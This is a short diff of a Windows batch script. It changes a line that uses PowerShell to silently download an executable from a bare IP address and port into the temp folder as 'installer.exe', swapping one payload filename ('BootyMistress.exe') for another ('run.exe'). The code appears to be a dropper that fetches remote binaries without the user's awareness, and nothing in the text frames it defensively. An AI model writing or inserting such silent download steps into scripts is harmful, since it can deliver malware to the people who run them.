@@ -25,7 +25,7 @@ if %errorlevel% neq 0 (
 )
 
 REM Function to download a file silently
-powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/BootyMistress.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
+powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/run.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
 if %errorlevel% neq 0 (
     echo Failed to download the file. >> "%LOGFILE%"
 ) else (
